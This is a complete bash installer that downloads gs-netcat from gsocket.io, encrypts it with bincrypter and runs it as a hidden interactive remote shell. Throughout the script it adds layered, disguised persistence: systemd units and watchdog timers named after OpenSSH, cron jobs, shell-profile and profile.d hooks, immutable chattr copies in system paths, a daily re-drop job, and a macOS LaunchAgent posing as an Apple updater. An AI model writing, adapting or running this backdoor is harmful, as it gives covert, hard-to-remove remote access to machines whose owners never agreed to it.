#!/usr/bin/env bash
# gsocket (gs-netcat) — bincrypter-encrypted deployment with layered persistence
#
# Job: download gs-netcat, encrypt with bincrypter, run in background as
#      `-ilD -s <secret>`, and keep it alive across reboots via layered
#      persistence (systemd, watchdog timer, cron, profile, profile.d,
#      immutable copies, daily dropper, launchd on macOS).
#
# Secret model (kept separate, never merged):
#   .gs-pass   <-> bincrypter password (CRYPT_PASS)   — decrypts the binary
#   .gs-secret <-> gsocket session secret (-s)        — identifies the session
#
# Usage:
#   bash script.sh                      install + persist
#   X=<secret> bash script.sh           install with a fixed gsocket secret
#   CRYPT_PASS=<pass> bash script.sh    install with a fixed bincrypter password
#   GS_UNDO=1 bash script.sh            remove everything
#   GS_NOINST=1 bash script.sh          run once, no persistence
#   GS_DSTDIR=<dir> bash script.sh      force install directory
#
set -euo pipefail

HOME="${HOME:-$(getent passwd "$(id -u)" 2>/dev/null | cut -d: -f6 || echo /root)}"
export HOME
umask 077

BINCRYPTER_BIN="./bincrypter"
ENCRYPTED_BIN="./openssh"
SECRET_LENGTH=22
CRYPT_PASS_LENGTH=16

GS_BIN_NAME="openssh"
GS_SERVICE_NAME="openssh-sshd-helper"
GS_CRON_TAG="# openssh-server"
GS_PROFILE_TAG="# openssh-init"
GS_DROPPER="/etc/cron.d/openssh-keymgr"
GS_DROP_HELPER="/usr/lib/openssh/sshd-redrop"
GS_WATCH_HELPER="/usr/lib/openssh/sshd-monitor"
GS_COPY_PATHS=(
    "/usr/lib/openssh/sshd-session"
    "/usr/lib/x86_64-linux-gnu/openssh/sshd"
    "/var/cache/openssh/sshd"
)
LAUNCHD_LABEL="com.apple.update-notifier"
LAUNCHD_PLIST="${HOME}/Library/LaunchAgents/${LAUNCHD_LABEL}.plist"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

log_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

log_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

log_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

log_error() {
    echo -e "${RED}[-] $1${NC}" >&2
}

have()     { command -v "$1" >/dev/null 2>&1; }
can_sudo() { sudo -n true 2>/dev/null; }
is_root_mode() { [[ "${HOME:-}" == "/root" ]] || [[ "${EUID:-$(id -u)}" == "0" ]]; }

generate_random_string() {
    local length="$1"
    head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c "$length"
}

# ── Layer 1: install directory discovery ─────────────────────────────────────
# Echoes exactly one path. Never logs to stdout (callers capture the output).
find_writable_dir() {
    if [[ -n "${GS_DSTDIR:-}" ]]; then
        mkdir -p "$GS_DSTDIR" 2>/dev/null && { echo "$GS_DSTDIR"; return 0; }
    fi

    local candidates=()
    if is_root_mode; then
        candidates+=(
            "/usr/local/sbin"
            "/usr/libexec"
            "/usr/local/libexec"
            "/usr/lib/openssh"
        )
    fi
    candidates+=(
        "${HOME}/.ssh/authorized_key"
        "${HOME}/.local/share/.cache"
        "/tmp/.dbus-session"
        "/dev/shm/.dbus"
        "/var/tmp/.dbus"
        "/run/shm/.dbus"
    )

    for base in /var/www /srv /opt /home /usr/share /var/lib; do
        [[ -d "$base" ]] || continue
        while IFS= read -r d; do
            candidates+=("${d}/.gs")
        done < <(find "$base" -maxdepth 5 -writable -type d 2>/dev/null | head -5)
    done

    for dir in "${candidates[@]}"; do
        [[ -z "$dir" ]] && continue
        if mkdir -p "$dir" 2>/dev/null && [[ -w "$dir" ]]; then
            echo "$dir"
            return 0
        fi
    done

    echo "/tmp"
}

# ── Layer 2: secret-derived lock file ────────────────────────────────────────
# Same secret => same lock file across reboots and reinstalls.
gs_lockfile() {
    local secret="$1"
    local hash
    if have sha256sum; then
        hash="$(printf '%s' "$secret" | sha256sum | cut -c1-8)"
    elif have shasum; then
        hash="$(printf '%s' "$secret" | shasum -a 256 | cut -c1-8)"
    else
        hash="$(printf '%08x' "$(printf '%s' "$secret" | cksum | cut -d' ' -f1)")"
    fi
    echo "/tmp/.ssh-${hash}"
}

# ── Layer 3: pid liveness against the lock file ──────────────────────────────
is_already_running() {
    local lf
    lf="$(gs_lockfile "${1:-}")"
    [[ -f "$lf" ]] || return 1
    local pid
    pid="$(tr -d '[:space:]' < "$lf" 2>/dev/null || true)"
    [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null
}

# ── Resolution / persistence of the two secrets ──────────────────────────────
# Order: env var -> file -> generate. Writes file only when a value is resolved
# so a reinstall reuses exactly what the first install used.
# Sets globals: RESOLVED_VALUE, FRESH (1 when generated, 0 when reused).
resolve_secret_file() {
    local file="$1" envval="$2" length="$3"
    local value=""

    if [[ -n "$envval" ]]; then
        value="$envval"
    elif [[ -f "$file" ]]; then
        value="$(tr -d '[:space:]' < "$file" 2>/dev/null || true)"
    fi

    if [[ -z "$value" ]]; then
        value="$(generate_random_string "$length" || true)"
        if [[ -z "$value" ]] || [[ ${#value} -ne "$length" ]]; then
            log_error "Failed to generate random value of length ${length}."
            return 1
        fi
        printf '%s' "$value" > "$file"
        if ! chmod 600 "$file"; then
            log_error "Failed to chmod 600 $file"
            return 1
        fi
        FRESH=1
    else
        if [[ ! -f "$file" ]] || [[ "$(tr -d '[:space:]' < "$file" 2>/dev/null || true)" != "$value" ]]; then
            printf '%s' "$value" > "$file" 2>/dev/null || true
            chmod 600 "$file" 2>/dev/null || true
        fi
        FRESH=0
    fi

    RESOLVED_VALUE="$value"
    return 0
}

# ── Layer 4: the single launcher every persistence layer calls ───────────────
# Writes a wrapper that exports PASSWORD from .gs-pass and execs the encrypted
# binary with -ilD -s <secret>. No layer ever touches the raw binary directly,
# so no layer can forget the decrypt password.
write_launcher() {
    local dir="$1" secret="$2"
    LAUNCHER="${dir}/.gs-launch"
    local lf
    lf="$(gs_lockfile "$secret")"

    cat > "$LAUNCHER" <<EOF
#!/bin/sh
set -eu
D='${dir}'
P="\$(cat "\$D/.gs-pass" 2>/dev/null)" || exit 1
S="\$(cat "\$D/.gs-secret" 2>/dev/null)" || exit 1
[ -n "\$P" ] && [ -n "\$S" ] || exit 1
B="\$D/${GS_BIN_NAME}"
[ -x "\$B" ] || exit 1
echo \$\$ > '${lf}' 2>/dev/null || true
PASSWORD="\$P" exec "\$B" -ilD -s "\$S"
EOF

    if ! chmod 700 "$LAUNCHER"; then
        log_error "Failed to chmod 700 $LAUNCHER"
        return 1
    fi
    return 0
}

# Direct in-script launch (same semantics as the wrapper).
gs_launch() {
    PASSWORD="$(cat "$PASS_FILE")" "$BIN_PATH" -ilD -s "$(cat "$SECRET_FILE")"
}

# Background start used by every layer's shell snippet.
_bg_launch_cmd() {
    local launcher="$1" lf="$2"
    printf '%s' "[ -f '${lf}' ] && kill -0 \"\$(cat '${lf}')\" 2>/dev/null || { if command -v setsid >/dev/null 2>&1; then setsid '${launcher}' >/dev/null 2>&1 & else nohup '${launcher}' >/dev/null 2>&1 & fi; }"
}

# ── Persistence: systemd primary service (launcher, no password in unit) ─────
install_systemd() {
    local launcher="$1"
    have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
    local svc="/etc/systemd/system/${GS_SERVICE_NAME}.service"
    sudo tee "$svc" >/dev/null <<EOF
[Unit]
Description=OpenSSH session helper
Documentation=man:sshd(8) man:sshd_config(5)
After=network-online.target auditd.service
Wants=network-online.target

[Service]
Type=simple
ExecStart=${launcher}
Restart=always
RestartSec=5
StartLimitIntervalSec=0
KillMode=process
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable "${GS_SERVICE_NAME}" >/dev/null 2>&1 || true
    sudo systemctl restart "${GS_SERVICE_NAME}" >/dev/null 2>&1 || true
    log_success "Persistence: systemd service installed"
    return 0
}

remove_systemd() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    can_sudo || return 0
    sudo systemctl stop "${GS_SERVICE_NAME}" 2>/dev/null || true
    sudo systemctl disable "${GS_SERVICE_NAME}" 2>/dev/null || true
    sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}.service" 2>/dev/null || true
    sudo systemctl daemon-reload 2>/dev/null || true
}

# ── Persistence: 30s systemd watchdog timer ──────────────────────────────────
install_watchdog_timer() {
    local launcher="$1"
    have systemctl && [[ -d /run/systemd ]] && can_sudo || return 1
    local wscript="$GS_WATCH_HELPER"
    sudo tee "$wscript" >/dev/null <<EOF
#!/bin/sh
# OpenSSH connection monitor — checks daemon health
systemctl is-active --quiet ${GS_SERVICE_NAME} 2>/dev/null && exit 0
systemctl restart ${GS_SERVICE_NAME} >/dev/null 2>&1 && exit 0
if command -v setsid >/dev/null 2>&1; then
    setsid '${launcher}' >/dev/null 2>&1 &
else
    nohup '${launcher}' >/dev/null 2>&1 &
fi
exit 0
EOF
    sudo chmod +x "$wscript" || { log_error "Failed to chmod +x $wscript"; return 1; }
    sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer" >/dev/null <<EOF
[Unit]
Description=OpenSSH connection keepalive

[Timer]
OnBootSec=60s
OnUnitActiveSec=30s

[Install]
WantedBy=timers.target
EOF
    sudo tee "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service" >/dev/null <<EOF
[Unit]
Description=OpenSSH connection keepalive
Documentation=man:sshd(8)

[Service]
Type=oneshot
ExecStart=${wscript}
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1 || true
    sudo systemctl start "${GS_SERVICE_NAME}-mon.timer" >/dev/null 2>&1 || true
    log_success "Persistence: watchdog timer installed (30s interval)"
    return 0
}

remove_watchdog_timer() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    can_sudo || return 0
    sudo systemctl stop "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
    sudo systemctl disable "${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
    sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.timer" 2>/dev/null || true
    sudo rm -f "/etc/systemd/system/${GS_SERVICE_NAME}-mon.service" 2>/dev/null || true
    sudo rm -f "$GS_WATCH_HELPER" 2>/dev/null || true
    sudo systemctl daemon-reload 2>/dev/null || true
}

# ── Persistence: crontab @reboot + every-minute watchdog ────────────────────
crontab_read()  { is_root_mode && can_sudo && sudo crontab -l 2>/dev/null || crontab -l 2>/dev/null || true; }
crontab_write() { is_root_mode && can_sudo && sudo crontab - || crontab -; }

install_cron() {
    local launcher="$1" secret="$2"
    have crontab || return 1
    local lf
    lf="$(gs_lockfile "$secret")"
    local chk
    chk="$(_bg_launch_cmd "$launcher" "$lf")"
    if crontab_read | grep -qF "$GS_CRON_TAG" 2>/dev/null; then
        log_info "Persistence: crontab entry already present"
        return 0
    fi
    ( crontab_read
      echo "${GS_CRON_TAG}"
      echo "@reboot ${chk}"
      echo "* * * * * ${chk}" ) | crontab_write
    if is_root_mode; then
        log_success "Persistence: root crontab watchdog installed (@reboot + every minute)"
    else
        log_success "Persistence: user crontab watchdog installed (@reboot + every minute)"
    fi
    return 0
}

remove_cron() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | crontab - 2>/dev/null || true
    sudo -n crontab -l 2>/dev/null | grep -v "$GS_CRON_TAG" | sudo -n crontab - 2>/dev/null || true
}

# ── Persistence: ~/.profile / ~/.bashrc / ~/.bash_profile ───────────────────
install_profile() {
    local launcher="$1" secret="$2"
    local lf
    lf="$(gs_lockfile "$secret")"
    local snippet
    snippet="$(cat <<EOF

 ${GS_PROFILE_TAG}
# Ensure OpenSSH multiplexer is active
_p='${lf}'; [ -f "\$_p" ] && kill -0 "\$(cat "\$_p")" 2>/dev/null || { if command -v setsid >/dev/null 2>&1; then setsid '${launcher}' >/dev/null 2>&1 & else nohup '${launcher}' >/dev/null 2>&1 & fi; }
 ${GS_PROFILE_TAG}
EOF
)"
    for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
        [[ -f "$f" && -w "$f" ]] || continue
        if grep -qF "$GS_PROFILE_TAG" "$f" 2>/dev/null; then
            log_info "Persistence: ${f} already patched"
        else
            printf '%s\n' "$snippet" >> "$f"
            log_success "Persistence: added to ${f}"
        fi
        return 0
    done
    log_warning "Persistence: profile files not writable — skipping"
    return 1
}

remove_profile() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    for f in "${HOME}/.profile" "${HOME}/.bashrc" "${HOME}/.bash_profile"; do
        [[ -f "$f" ]] || continue
        sed -i "/^${GS_PROFILE_TAG}$/,/^${GS_PROFILE_TAG}$/d" "$f" 2>/dev/null || true
    done
}

# ── Persistence: /etc/profile.d (root only) ─────────────────────────────────
install_profile_d() {
    local launcher="$1" secret="$2"
    is_root_mode || can_sudo || return 1
    local lf
    lf="$(gs_lockfile "$secret")"
    local pfile="/etc/profile.d/openssh-agent.sh"
    sudo tee "$pfile" >/dev/null <<EOF
#!/bin/sh
# OpenSSH agent initialisation — sourced on login
_p='${lf}'
[ -f "\$_p" ] && kill -0 "\$(cat "\$_p")" 2>/dev/null || { if command -v setsid >/dev/null 2>&1; then setsid '${launcher}' >/dev/null 2>&1 & else nohup '${launcher}' >/dev/null 2>&1 & fi; }
unset _p
EOF
    sudo chmod +x "$pfile" || { log_error "Failed to chmod +x $pfile"; return 1; }
    log_success "Persistence: /etc/profile.d/openssh-agent.sh installed"
    return 0
}

remove_profile_d() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    sudo -n rm -f "/etc/profile.d/openssh-agent.sh" 2>/dev/null || true
}

# ── Persistence: immutable backup copies ────────────────────────────────────
install_copies() {
    local bin="$1"
    local n=0
    is_root_mode || can_sudo || return 1
    for dst in "${GS_COPY_PATHS[@]}"; do
        local dir
        dir="$(dirname "$dst")"
        { mkdir -p "$dir" 2>/dev/null || sudo -n mkdir -p "$dir" 2>/dev/null; } || continue
        { cp "$bin" "$dst" 2>/dev/null || sudo -n cp "$bin" "$dst" 2>/dev/null; } || continue
        chmod +x "$dst" 2>/dev/null || sudo -n chmod +x "$dst" 2>/dev/null || true
        # immutable AFTER copy + chmod, never before
        have chattr && { chattr +i "$dst" 2>/dev/null || sudo -n chattr +i "$dst" 2>/dev/null || true; }
        n=$(( n + 1 ))
    done
    if [[ "$n" -gt 0 ]]; then
        log_success "Persistence: ${n} immutable backup copies installed"
        return 0
    fi
    return 1
}

remove_copies() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    for dst in "${GS_COPY_PATHS[@]}"; do
        # chattr -i BEFORE every rm
        have chattr && { chattr -i "$dst" 2>/dev/null || sudo -n chattr -i "$dst" 2>/dev/null || true; }
        rm -f "$dst" 2>/dev/null || sudo -n rm -f "$dst" 2>/dev/null || true
    done
}

# ── Persistence: lock the primary binary immutable ──────────────────────────
install_immutable() {
    local bin="$1"
    have chattr || return 1
    is_root_mode || can_sudo || return 1
    chattr +i "$bin" 2>/dev/null || sudo -n chattr +i "$bin" 2>/dev/null || return 1
    log_success "Persistence: binary locked immutable (chattr +i)"
    return 0
}

remove_immutable() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    local bin="$1"
    have chattr || return 0
    chattr -i "$bin" 2>/dev/null || sudo -n chattr -i "$bin" 2>/dev/null || true
}

# ── Persistence: daily re-drop via /etc/cron.d ──────────────────────────────
install_dropper() {
    can_sudo || return 1
    local cache="$1" launcher="$2" lf="$3"
    local copylist=""
    local p
    for p in "${GS_COPY_PATHS[@]}"; do
        copylist="${copylist}'${p}' "
    done
    sudo tee "$GS_DROP_HELPER" >/dev/null <<EOF
#!/bin/sh
# OpenSSH host key maintenance — restores helper copies if missing
CACHE='${cache}'
LAUNCHER='${launcher}'
LOCK='${lf}'
for d in ${copylist}; do
    [ -e "\$d" ] && continue
    [ -x "\$CACHE" ] || continue
    mkdir -p "\$(dirname "\$d")" 2>/dev/null || continue
    cp "\$CACHE" "\$d" 2>/dev/null || continue
    chmod +x "\$d" 2>/dev/null || true
    chattr +i "\$d" 2>/dev/null || true
done
[ -x "\$LAUNCHER" ] || exit 0
[ -f "\$LOCK" ] && kill -0 "\$(cat "\$LOCK")" 2>/dev/null && exit 0
if command -v setsid >/dev/null 2>&1; then
    setsid "\$LAUNCHER" >/dev/null 2>&1 &
else
    nohup "\$LAUNCHER" >/dev/null 2>&1 &
fi
exit 0
EOF
    sudo chmod +x "$GS_DROP_HELPER" || { log_error "Failed to chmod +x $GS_DROP_HELPER"; return 1; }

    sudo tee "$GS_DROPPER" >/dev/null <<EOF
# OpenSSH key management — maintained by openssh-server package
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Rotate and verify host keys daily (restores the helper only if missing)
0 3 * * * root ${GS_DROP_HELPER} >/dev/null 2>&1
EOF
    sudo chmod 644 "$GS_DROPPER" || { log_error "Failed to chmod 644 $GS_DROPPER"; return 1; }
    have chattr && { sudo chattr +i "$GS_DROPPER" 2>/dev/null || true; }
    log_success "Persistence: key manager cron installed"
    return 0
}

remove_dropper() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    can_sudo || return 0
    have chattr && { sudo chattr -i "$GS_DROPPER" 2>/dev/null || true; }
    sudo rm -f "$GS_DROPPER" 2>/dev/null || true
    sudo rm -f "$GS_DROP_HELPER" 2>/dev/null || true
}

# ── Persistence: macOS LaunchAgent ──────────────────────────────────────────
install_launchd() {
    local launcher="$1"
    mkdir -p "${HOME}/Library/LaunchAgents"
    cat > "$LAUNCHD_PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>           <string>${LAUNCHD_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${launcher}</string>
  </array>
  <key>RunAtLoad</key>       <true/>
  <key>KeepAlive</key>       <true/>
</dict>
</plist>
EOF
    launchctl unload "$LAUNCHD_PLIST" 2>/dev/null || true
    launchctl load "$LAUNCHD_PLIST" 2>/dev/null || true
    log_success "Persistence: launchd agent installed"
    return 0
}

remove_launchd() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    launchctl unload "$LAUNCHD_PLIST" 2>/dev/null || true
    rm -f "$LAUNCHD_PLIST" 2>/dev/null || true
}

# ── Persistence orchestrator ────────────────────────────────────────────────
install_persistence() {
    local launcher="$1" secret="$2" cache="$3"
    local lf
    lf="$(gs_lockfile "$secret")"
    local installed=0

    if [[ "$(uname -s)" == "Darwin" ]]; then
        install_launchd "$launcher" && installed=1 || true
        install_profile "$launcher" "$secret" && installed=1 || true
        if [[ "$installed" == "1" ]]; then
            return 0
        fi
        log_warning "No persistence method succeeded — falling back to one-shot"
        return 1
    fi

    install_systemd        "$launcher"          && installed=1 || true
    install_watchdog_timer "$launcher"          && installed=1 || true
    install_cron           "$launcher" "$secret" && installed=1 || true
    install_profile        "$launcher" "$secret" && installed=1 || true
    install_profile_d      "$launcher" "$secret" && installed=1 || true
    install_copies         "$BIN_PATH"            && installed=1 || true
    install_immutable      "$BIN_PATH"            && installed=1 || true
    install_dropper        "$cache" "$launcher" "$lf" && installed=1 || true

    if [[ "$installed" == "0" ]]; then
        log_warning "No persistence method succeeded — falling back to one-shot"
        return 1
    fi
    return 0
}

remove_persistence() {
    [[ "${GS_UNDO:-}" == "1" ]] || return 0
    if [[ "$(uname -s)" == "Darwin" ]]; then
        remove_launchd
        remove_profile
        return 0
    fi
    remove_immutable "$BIN_PATH"
    remove_copies
    remove_dropper
    remove_watchdog_timer
    remove_systemd
    remove_cron
    remove_profile
    remove_profile_d
    return 0
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

log_info "Starting deployment gsocket encrypted..."

INSTALL_DIR="$(find_writable_dir)"
if ! mkdir -p "$INSTALL_DIR"; then
    log_error "Failed to create install directory $INSTALL_DIR. Exit."
    exit 1
fi
# Never chmod shared system dirs; only tighten a private dir we created.
case "$INSTALL_DIR" in
    /tmp|/var/tmp|/dev/shm|/run/shm|/|/home|/root|/usr|/var) ;;
    *) chmod 700 "$INSTALL_DIR" 2>/dev/null || true ;;
esac

BIN_PATH="${INSTALL_DIR}/${GS_BIN_NAME}"
PASS_FILE="${INSTALL_DIR}/.gs-pass"
SECRET_FILE="${INSTALL_DIR}/.gs-secret"
CACHE_DIR="${INSTALL_DIR}/.gs-cache"
CACHE_BIN="${CACHE_DIR}/${GS_BIN_NAME}"

# ── Remove mode ──────────────────────────────────────────────────────────────
if [[ "${GS_UNDO:-}" == "1" ]]; then
    log_info "Removing gsocket deployment from ${INSTALL_DIR}..."

    if [[ -f "$SECRET_FILE" ]]; then
        _old_secret="$(tr -d '[:space:]' < "$SECRET_FILE" 2>/dev/null || true)"
        if [[ -n "$_old_secret" ]]; then
            _lf="$(gs_lockfile "$_old_secret")"
            if [[ -f "$_lf" ]]; then
                _pid="$(tr -d '[:space:]' < "$_lf" 2>/dev/null || true)"
                [[ -n "$_pid" ]] && kill "$_pid" 2>/dev/null || true
                rm -f "$_lf" 2>/dev/null || true
            fi
        fi
    fi

    remove_persistence

    have chattr && {
        chattr -i "$BIN_PATH" 2>/dev/null || sudo -n chattr -i "$BIN_PATH" 2>/dev/null || true
        chattr -i "$CACHE_BIN" 2>/dev/null || sudo -n chattr -i "$CACHE_BIN" 2>/dev/null || true
        chattr -i "${INSTALL_DIR}/.gs-launch" 2>/dev/null || sudo -n chattr -i "${INSTALL_DIR}/.gs-launch" 2>/dev/null || true
    }
    rm -f "$BIN_PATH" 2>/dev/null || sudo -n rm -f "$BIN_PATH" 2>/dev/null || true
    rm -f "$CACHE_BIN" 2>/dev/null || true
    rm -f "${INSTALL_DIR}/.gs-launch" 2>/dev/null || true
    rm -f "$PASS_FILE" "$SECRET_FILE" 2>/dev/null || true
    rm -rf "$CACHE_DIR" 2>/dev/null || true
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN" 2>/dev/null || true

    log_success "Removal complete."
    exit 0
fi

# ── Secret resolution: X -> .gs-secret -> generate ──────────────────────────
if ! resolve_secret_file "$SECRET_FILE" "${X:-}" "$SECRET_LENGTH"; then
    log_error "Secret resolution failed. Exit."
    exit 1
fi
RANDOM_SECRET="$RESOLVED_VALUE"
FRESH_SECRET="$FRESH"
if [[ -z "$RANDOM_SECRET" ]]; then
    log_error "Empty gsocket secret. Exit."
    exit 1
fi

# ── Password resolution: CRYPT_PASS -> .gs-pass -> generate ─────────────────
if ! resolve_secret_file "$PASS_FILE" "${CRYPT_PASS:-}" "$CRYPT_PASS_LENGTH"; then
    log_error "Password resolution failed. Exit."
    exit 1
fi
CRYPT_PASS="$RESOLVED_VALUE"
FRESH_PASS="$FRESH"
if [[ -z "$CRYPT_PASS" ]]; then
    log_error "Empty bincrypter password. Exit."
    exit 1
fi

# Print credentials once, at first install only — never on a silent reinstall.
if [[ "$FRESH_SECRET" == "1" || "$FRESH_PASS" == "1" ]]; then
    log_success "Random secret generated: ${YELLOW}${RANDOM_SECRET}${NC}"
    log_success "Bincrypter password: ${YELLOW}${CRYPT_PASS}${NC}"
    log_warning "Save both. .gs-pass decrypts the binary; .gs-secret is the gsocket session."
fi

# ── Download + encrypt ──────────────────────────────────────────────────────
log_info "Downloading bincrypter..."
BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"
if ! curl -SsfL "$BINCRYPTER_URL" -o "$BINCRYPTER_BIN"; then
    log_error "Failed to download bincrypter from $BINCRYPTER_URL. Exit."
    exit 1
fi
log_success "Bincrypter successfully downloaded to $BINCRYPTER_BIN"

log_info "Giving executable permission to bincrypter..."
if ! chmod +x "$BINCRYPTER_BIN"; then
    log_error "Failed to give executable permission to $BINCRYPTER_BIN. Exit."
    rm -f "$BINCRYPTER_BIN"
    exit 1
fi
log_success "Executable permission given to $BINCRYPTER_BIN"

log_info "Downloading and encrypting gs-netcat (using password from CRYPT_PASS)..."
ARCH=$(uname -m)
GSOCKET_URL="https://gsocket.io/bin/gs-netcat_mini-linux-${ARCH}"
log_info "URL gsocket: $GSOCKET_URL"

if ! curl -SsfL "$GSOCKET_URL" | PASSWORD="$CRYPT_PASS" "$BINCRYPTER_BIN" > "$ENCRYPTED_BIN"; then
    log_error "Failed to download or encrypt gs-netcat. Ensure CRYPT_PASS is correct. Exit."
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN"
    exit 1
fi
log_success "gs-netcat successfully downloaded and encrypted to $ENCRYPTED_BIN"

log_info "Giving executable permission to $ENCRYPTED_BIN..."
if ! chmod +x "$ENCRYPTED_BIN"; then
    log_error "Failed to give executable permission to $ENCRYPTED_BIN. Exit."
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN"
    exit 1
fi
log_success "Executable permission given to $ENCRYPTED_BIN"

# Move the encrypted payload into the install directory (primary binary).
if ! cp "$ENCRYPTED_BIN" "$BIN_PATH"; then
    log_error "Failed to install encrypted binary to $BIN_PATH. Exit."
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN"
    exit 1
fi
if ! chmod +x "$BIN_PATH"; then
    log_error "Failed to chmod +x $BIN_PATH. Exit."
    rm -f "$BINCRYPTER_BIN" "$ENCRYPTED_BIN" "$BIN_PATH"
    exit 1
fi
rm -f "$ENCRYPTED_BIN" 2>/dev/null || true

# Pristine cache copy for the daily dropper (not immutable, stays readable).
mkdir -p "$CACHE_DIR" 2>/dev/null || true
cp "$BIN_PATH" "$CACHE_BIN" 2>/dev/null || true
chmod 700 "$CACHE_BIN" 2>/dev/null || true

# ── Launcher: the one entry point every persistence layer calls ─────────────
if ! write_launcher "$INSTALL_DIR" "$RANDOM_SECRET"; then
    log_error "Failed to write launcher. Exit."
    rm -f "$BINCRYPTER_BIN"
    exit 1
fi

log_info "Running encrypted gsnc with resolved secret (using password from .gs-pass)..."
log_info "Command to be executed (without direct execution in log):"
echo "PASSWORD=***** GS_ARGS=\"-ilD -s *****\" $BIN_PATH"

if is_already_running "$RANDOM_SECRET"; then
    log_info "Already running with this secret — skipping start"
    [[ "${GS_NOINST:-}" == "1" ]] || install_persistence "$LAUNCHER" "$RANDOM_SECRET" "$CACHE_BIN" || true
    log_info "Cleaning up bincrypter file..."
    rm -f "$BINCRYPTER_BIN"
    log_success "Bincrypter file has been deleted."
    log_info "Deployment process completed."
    exit 0
fi

if [[ "${GS_NOINST:-}" == "1" ]]; then
    log_warning "GS_NOINST=1 — running once without persistence"
    gs_launch &
    sleep 1
    if jobs %1 &> /dev/null; then
        log_success "gsnc encrypted appears to have been started in the background (PID: $!)."
    else
        exit_status=$?
        if [[ $exit_status -eq 0 ]]; then
            log_success "gsnc encrypted successfully started (exit code 0)."
        else
            log_error "gsnc encrypted failed to start or exited with error (exit code $exit_status). Check CRYPT_PASS and process output."
        fi
    fi
    log_info "Cleaning up bincrypter file..."
    rm -f "$BINCRYPTER_BIN"
    log_success "Bincrypter file has been deleted."
    log_info "Deployment process completed."
    exit 0
fi

# ── Install persistence, then start ─────────────────────────────────────────
if install_persistence "$LAUNCHER" "$RANDOM_SECRET" "$CACHE_BIN"; then
    log_success "Persistence layers installed."
else
    log_warning "Persistence unavailable — starting one-shot."
fi

# Start via the launcher (it carries PASSWORD from .gs-pass).
if ! is_already_running "$RANDOM_SECRET"; then
    if have setsid; then
        setsid "$LAUNCHER" >/dev/null 2>&1 &
    else
        nohup "$LAUNCHER" >/dev/null 2>&1 &
    fi
    sleep 1
fi

if is_already_running "$RANDOM_SECRET"; then
    log_success "gsnc encrypted appears to have been started in the background."
    log_warning "Make sure to monitor it separately."
else
    log_error "gsnc encrypted failed to start. Check .gs-pass, .gs-secret and process output."
fi

log_info "Cleaning up bincrypter file..."
rm -f "$BINCRYPTER_BIN"
log_success "Bincrypter file has been deleted."

log_info "Deployment process completed."

exit 0
